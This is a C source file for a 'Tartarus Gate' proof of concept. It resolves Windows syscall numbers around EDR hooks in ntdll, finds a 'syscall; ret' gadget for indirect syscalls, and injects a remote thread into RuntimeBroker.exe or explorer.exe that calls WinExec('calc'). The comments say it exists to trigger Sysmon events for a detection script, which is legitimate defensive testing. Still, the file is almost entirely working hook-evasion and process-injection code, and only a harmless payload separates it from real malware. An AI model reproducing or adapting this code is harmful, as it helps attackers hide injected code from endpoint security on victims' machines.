/*
 * Tartarus Gate POC  --  RuntimeBroker.exe injection  (C / Win64)
 *
 * Technique
 * ---------
 *   Hell's Gate    : read SSN from ntdll stub bytes (4C 8B D1 B8 [SSN])
 *   Tartarus' Gate : if the stub is hooked, recover SSN from a clean
 *                    neighbour via ordinal arithmetic
 *   Indirect call  : jump to ntdll's own "syscall;ret" gadget so the
 *                    kernel sees the return address inside ntdll, not in
 *                    our PE -- the classic indirect-syscall signature
 *
 * The actual stubs are in syscalls.asm (ml64 assembles them).
 * This file resolves SSNs, sets the globals defined there, then
 * performs the injection.
 *
 * Injection flow
 * --------------
 *   1. Find RuntimeBroker.exe PID (falls back to explorer.exe)
 *   2. ZwOpenProcess(PROCESS_ALL_ACCESS)       -> Sysmon Event 10
 *   3. ZwAllocateVirtualMemory in target       -> allocate "calc\0"
 *   4. ZwWriteVirtualMemory                    -> write "calc\0"
 *   5. Resolve WinExec VA from our kernel32    -> same VA in target (ASLR
 *      is per-boot; all processes share the same mapped VA for a DLL)
 *   6. ZwCreateThreadEx at WinExec("calc",1)   -> Sysmon Event 8
 *
 * Steps 2 and 6 both fire Sysmon events with the indirect-syscall
 * CallTrace pattern that Invoke-SyscallDetect.ps1 analyses.
 *
 * Build
 * -----
 *   run build.bat from an x64 MSVC developer prompt
 *   (or double-click it -- it calls vcvars64.bat internally)
 */

#include "syscalls.h"
#include <stdio.h>
#include <tlhelp32.h>

/* ── PE parsing helpers for ntdll ───────────────────────────────────────── */

typedef struct {
    LPVOID  base;
    DWORD  *functions;
    DWORD  *names;
    WORD   *ordinals;
    DWORD   numNames;
} NtdllExports;

static BOOL get_exports(NtdllExports *out)
{
    LPVOID base = (LPVOID)GetModuleHandleA("ntdll.dll");
    if (!base) return FALSE;

    PIMAGE_DOS_HEADER   dos  = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS64 nt   = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                      .VirtualAddress;
    if (!expRva) return FALSE;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)base + expRva);
    out->base      = base;
    out->functions = (DWORD*)((BYTE*)base + exp->AddressOfFunctions);
    out->names     = (DWORD*)((BYTE*)base + exp->AddressOfNames);
    out->ordinals  = (WORD *)((BYTE*)base + exp->AddressOfNameOrdinals);
    out->numNames  = exp->NumberOfNames;
    return TRUE;
}

/* Returns VA of named export; *ordinal_out = its index in AddressOfFunctions */
static LPVOID find_export(const NtdllExports *e, const char *name, int *ordinal_out)
{
    for (DWORD i = 0; i < e->numNames; i++) {
        const char *n = (const char*)((BYTE*)e->base + e->names[i]);
        if (strcmp(n, name) == 0) {
            WORD ord = e->ordinals[i];
            if (ordinal_out) *ordinal_out = (int)ord;
            return (LPVOID)((BYTE*)e->base + e->functions[ord]);
        }
    }
    return NULL;
}

/* Clean (un-hooked) ntdll stub starts with: 4C 8B D1 B8 */
static BOOL is_clean(BYTE *va)
{
    return va[0]==0x4C && va[1]==0x8B && va[2]==0xD1 && va[3]==0xB8;
}
static DWORD read_ssn(BYTE *va) { return *(WORD*)(va + 4); }

/* ── Step 1: Find "syscall ; ret" gadget inside ntdll .text ─────────────── */

static LPVOID find_gadget(LPVOID ntdllBase)
{
    PIMAGE_DOS_HEADER   dos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS64 nt  = (PIMAGE_NT_HEADERS64)((BYTE*)ntdllBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        BYTE *text = (BYTE*)ntdllBase + sec->VirtualAddress;
        DWORD size = sec->SizeOfRawData;
        for (DWORD off = 0; off < size - 2; off++) {
            if (text[off]==0x0F && text[off+1]==0x05 && text[off+2]==0xC3)
                return (LPVOID)(text + off);
        }
    }
    return NULL;
}

/* ── Step 2: Resolve SSN via Hell's Gate / Tartarus' Gate ───────────────── */

static DWORD resolve_ssn(const NtdllExports *e, const char *name)
{
    int    targetOrd = -1;
    BYTE  *targetVa  = (BYTE*)find_export(e, name, &targetOrd);
    if (!targetVa) return (DWORD)-1;

    if (is_clean(targetVa))
        return read_ssn(targetVa);

    /* Stub is hooked: scan neighbouring ordinals for a clean stub,
     * then derive our SSN by adding the offset back. */
    for (int delta = 1; delta <= 32; delta++) {
        for (int dir = -1; dir <= 1; dir += 2) {
            int nOrd = targetOrd + dir * delta;
            if (nOrd < 0) continue;
            BYTE *nVa = (BYTE*)e->base + e->functions[nOrd];
            if (!is_clean(nVa)) continue;
            return (DWORD)((int)read_ssn(nVa) - dir * delta);
        }
    }
    return (DWORD)-1;
}

/* ── Step 3: Write resolved SSNs + gadget into the ASM globals ───────────── */

static BOOL init_syscalls(const NtdllExports *e)
{
    const char *names[] = {
        "NtOpenProcess",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
    };
    DWORD *globals[] = {
        &g_ssnNtOpenProcess,
        &g_ssnNtAllocateVirtualMemory,
        &g_ssnNtWriteVirtualMemory,
        &g_ssnNtCreateThreadEx,
    };

    LPVOID gadget = find_gadget(e->base);
    if (!gadget) { fprintf(stderr, "[-] syscall;ret gadget not found\n"); return FALSE; }
    g_pGadget = (ULONG_PTR)gadget;
    printf("[*] syscall;ret gadget   : 0x%p\n", gadget);

    for (int i = 0; i < 4; i++) {
        DWORD ssn = resolve_ssn(e, names[i]);
        if (ssn == (DWORD)-1) {
            fprintf(stderr, "[-] Could not resolve SSN for %s\n", names[i]);
            return FALSE;
        }
        *globals[i] = ssn;
        printf("[*] %-30s SSN=0x%04X (%u)\n", names[i], ssn, ssn);
    }
    return TRUE;
}

/* ── Find target PID by executable name ─────────────────────────────────── */

static DWORD find_pid(const char *exeName)
{
    /* Use W variants explicitly: PROCESSENTRY32W, Process32FirstW/NextW are
     * always defined regardless of the UNICODE project setting.
     * PROCESSENTRY32A is not typedef'd in all SDK versions. */
    wchar_t wName[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, exeName, -1, wName, MAX_PATH);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ── Main ────────────────────────────────────────────────────────────────── */

int main(void)
{
    printf("[*] Tartarus Gate + Indirect Syscall POC\n");
    printf("[*] Target: RuntimeBroker.exe  Payload: calc.exe via WinExec\n\n");

    /* --- Resolve SSNs & gadget ------------------------------------------ */
    NtdllExports exports = {0};
    if (!get_exports(&exports)) {
        fprintf(stderr, "[-] get_exports failed\n");
        return 1;
    }
    printf("[*] ntdll base           : 0x%p\n", exports.base);

    if (!init_syscalls(&exports)) return 1;

    printf("\n[*] All SSNs resolved. Proceeding with injection...\n\n");

    /* --- Locate target process ------------------------------------------ */
    DWORD targetPid = find_pid("RuntimeBroker.exe");
    const char *targetName = "RuntimeBroker.exe";
    if (!targetPid) {
        printf("[!] RuntimeBroker.exe not found, trying explorer.exe\n");
        targetPid = find_pid("explorer.exe");
        targetName = "explorer.exe";
    }
    if (!targetPid) {
        fprintf(stderr, "[-] No suitable target process found\n");
        return 1;
    }
    printf("[*] Target: %-20s PID=%lu\n", targetName, targetPid);

    /* --- ZwOpenProcess (Sysmon Event 10 with INDIRECT_SYSCALL trace) ----- */
    HANDLE hTarget = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    InitObjectAttribs(&oa);
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)targetPid;
    cid.UniqueThread  = NULL;

    printf("[*] ZwOpenProcess (indirect syscall) ...\n");
    NTSTATUS status = ZwOpenProcess(
        &hTarget, PROCESS_ALL_ACCESS, &oa, &cid);

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] ZwOpenProcess failed  NTSTATUS=0x%08lX\n", status);
        fprintf(stderr, "    (try running as Administrator or use Task Manager to\n");
        fprintf(stderr, "     confirm the process is accessible)\n");
        return 1;
    }
    printf("[+] ZwOpenProcess OK  handle=0x%p\n", hTarget);
    printf("[+] --> Sysmon Event 10 (ProcessAccess) fired\n\n");

    /* --- ZwAllocateVirtualMemory  (write "calc\0" into target) ----------- */
    PVOID  pRemote   = NULL;
    SIZE_T allocSize = 16; /* enough for "calc\0" */

    printf("[*] ZwAllocateVirtualMemory in %s ...\n", targetName);
    status = ZwAllocateVirtualMemory(
        hTarget, &pRemote, 0, &allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] ZwAllocateVirtualMemory failed  NTSTATUS=0x%08lX\n", status);
        CloseHandle(hTarget);
        return 1;
    }
    printf("[+] Remote buffer allocated at 0x%p  (%zu bytes)\n", pRemote, allocSize);

    /* --- ZwWriteVirtualMemory  (write "calc\0") -------------------------- */
    const char payload[] = "calc";  /* WinExec first arg */
    SIZE_T written = 0;

    printf("[*] ZwWriteVirtualMemory \"calc\" ...\n");
    status = ZwWriteVirtualMemory(
        hTarget, pRemote,
        (PVOID)payload, sizeof(payload), &written);

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] ZwWriteVirtualMemory failed  NTSTATUS=0x%08lX\n", status);
        CloseHandle(hTarget);
        return 1;
    }
    printf("[+] Wrote %zu bytes to remote buffer\n", written);

    /* --- Resolve WinExec in our process (same VA in target due to ASLR) -- */
    HMODULE hK32     = GetModuleHandleA("kernel32.dll");
    LPVOID  pWinExec = (LPVOID)GetProcAddress(hK32, "WinExec");
    if (!pWinExec) {
        fprintf(stderr, "[-] GetProcAddress(WinExec) failed\n");
        CloseHandle(hTarget);
        return 1;
    }
    printf("[*] WinExec VA           : 0x%p  (shared across all processes)\n", pWinExec);

    /* --- ZwCreateThreadEx (Sysmon Event 8 CreateRemoteThread) ------------ */
    HANDLE hThread = NULL;

    printf("[*] ZwCreateThreadEx at WinExec in %s (indirect syscall) ...\n", targetName);
    status = ZwCreateThreadEx(
        &hThread,
        GENERIC_ALL,        /* DesiredAccess */
        NULL,               /* ObjectAttributes */
        hTarget,            /* ProcessHandle */
        pWinExec,           /* StartRoutine = WinExec */
        pRemote,            /* Argument     = "calc\0" */
        0,                  /* CreateFlags  = start immediately */
        0, 0, 0,            /* ZeroBits, StackSize, MaxStackSize */
        NULL                /* AttributeList */
    );

    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] ZwCreateThreadEx failed  NTSTATUS=0x%08lX\n", status);
        CloseHandle(hTarget);
        return 1;
    }
    printf("[+] Remote thread created  handle=0x%p\n", hThread);
    printf("[+] --> Sysmon Event 8  (CreateRemoteThread) fired\n");
    printf("[+] --> calc.exe launching inside %s\n\n", targetName);

    /* Give Sysmon enough time to flush its internal event buffer to ETL */
    printf("[*] Sleeping 4 s to let Sysmon flush events...\n");
    Sleep(4000);

    /* --- Cleanup --------------------------------------------------------- */
    CloseHandle(hThread);
    CloseHandle(hTarget);

    printf("[+] Done.\n");
    printf("[+] Run Invoke-SyscallDetect.ps1 against this binary.\n");
    printf("[+] Expected detections:\n");
    printf("      INDIRECT_SYSCALL  -- Event 10 ProcessAccess on %s\n", targetName);
    printf("      REMOTE_THREAD     -- Event 8  CreateRemoteThread in %s\n", targetName);
    return 0;
}
